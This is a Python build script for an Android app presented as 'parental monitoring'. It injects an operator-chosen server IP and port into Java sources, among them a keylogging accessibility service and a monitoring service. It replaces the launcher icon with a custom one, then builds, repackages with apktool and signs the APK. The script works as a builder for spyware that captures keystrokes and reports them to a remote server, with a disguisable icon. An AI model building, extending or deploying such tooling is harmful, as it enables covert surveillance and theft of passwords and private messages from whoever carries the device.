# build.py
import argparse
import os
import shutil
import subprocess
import tempfile
from pathlib import Path
import ipaddress

def create_project_dir(temp_dir, ip, port, icon):
    project_dir = Path(temp_dir) / "childmonitoring"
    print(f"Creating project dir at: {project_dir}")
    project_dir.mkdir(parents=True, exist_ok=True)

    # Check if source directory exists
    source_dir = Path("childmonitoring")
    if not source_dir.exists():
        raise FileNotFoundError("Source directory 'childmonitoring' not found in workspace")

    # Validate IP address format
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        raise ValueError(f"Invalid IP address: {ip}")

    print(f"Injecting IP: {ip} and Port: {port} into Java source files")

    # Copy pre-built Android project
    shutil.copytree(source_dir, project_dir, dirs_exist_ok=True)

    # Ensure gradlew is executable
    gradlew_path = project_dir / "gradlew"
    if gradlew_path.exists():
        os.chmod(gradlew_path, 0o755)
    else:
        raise FileNotFoundError(f"gradlew not found in {project_dir}")

    # Update server config in Java files
    java_files = ["MainActivity.java", "MonitoringService.java", "KeylogAccessibilityService.java"]
    for file in java_files:
        path = project_dir / f"app/src/main/java/com/xyz/child/{file}"
        if not path.exists():
            print(f"Warning: {file} not found at {path}, skipping injection")
            continue
        with open(path, "r") as f:
            content = f.read()
        original_content = content
        content = content.replace(
            'private static final String SERVER_HOST = "192.168.1.100";',
            f'private static final String SERVER_HOST = "{ip}";'
        ).replace(
            'private static final String SERVER_HOST = "192.168.0.102";',
            f'private static final String SERVER_HOST = "{ip}";'
        )
        content = content.replace(
            "private static final int SERVER_PORT = 8080;",
            f"private static final int SERVER_PORT = {port};"
        ).replace(
            "private static final int SERVER_PORT = 7100;",
            f"private static final int SERVER_PORT = {port};"
        )
        if content == original_content:
            print(f"Warning: No IP/port replacements made in {file}. Ensure SERVER_HOST and SERVER_PORT constants exist.")
        else:
            print(f"Successfully updated {file} with IP: {ip} and Port: {port}")
        with open(path, "w") as f:
            f.write(content)

    # Copy icon if provided
    if icon and os.path.exists(icon):
        for density in ["hdpi", "mdpi", "xhdpi", "xxhdpi", "xxxhdpi"]:
            dest = project_dir / f"app/src/main/res/mipmap-{density}/ic_launcher.webp"
            shutil.copy(icon, dest)
            print(f"Copied icon to {dest}")
    else:
        print("Warning: No valid icon provided, using existing icon")

    return project_dir

def build_apk(project_dir, output):
    try:
        gradlew_path = project_dir / "gradlew"
        if not gradlew_path.exists():
            raise FileNotFoundError(f"gradlew not found in {project_dir}")

        print("Building APK using Gradle...")
        subprocess.run([str(gradlew_path), "assembleDebug", "--no-configuration-cache"], cwd=project_dir, check=True)

        apk_path = project_dir / "app/build/outputs/apk/debug/app-debug.apk"
        if not apk_path.exists():
            raise FileNotFoundError(f"Gradle build failed: {apk_path} not found")

        decompiled_dir = project_dir / "decompiled"
        print("Decompiling APK...")
        subprocess.run(["java", "-jar", "apktool.jar", "d", str(apk_path), "-o", str(decompiled_dir)], check=True)

        print("Recompiling APK...")
        subprocess.run(["java", "-jar", "apktool.jar", "b", str(decompiled_dir), "-o", str(project_dir / "unsigned.apk")], check=True)

        unsigned_apk = project_dir / "unsigned.apk"
        if not unsigned_apk.exists():
            raise FileNotFoundError(f"APK recompilation failed: {unsigned_apk} not found")

        print("Signing APK...")
        subprocess.run(["java", "-jar", "sign.jar", "--apks", str(unsigned_apk), "--out", output], check=True)

        print(f"✅ APK generated successfully at: {output}")
    except subprocess.CalledProcessError as e:
        print(f"❌ Build failed: {e}")
    except FileNotFoundError as e:
        print(f"❌ Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Build Parental Monitoring APK")
    parser.add_argument("--build", action="store_true", help="Trigger APK build")
    parser.add_argument("--ip", required=True, help="Server IP address")
    parser.add_argument("--port", type=int, required=True, help="Server port")
    parser.add_argument("--output", default="child.apk", help="Output APK file path")
    parser.add_argument("--icon", help="Path to app icon (PNG or WEBP)")
    args = parser.parse_args()

    if not args.build:
        print("Use --build to generate the APK")
        return
    if not (0 <= args.port <= 65535):
        print("Error: Port must be between 0 and 65535")
        return
    if not args.output.endswith(".apk"):
        args.output += ".apk"

    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            project_dir = create_project_dir(temp_dir, args.ip, args.port, args.icon)
            build_apk(project_dir, args.output)
    except Exception as e:
        print(f"❌ Error during build process: {e}")

if __name__ == "__main__":
    main()
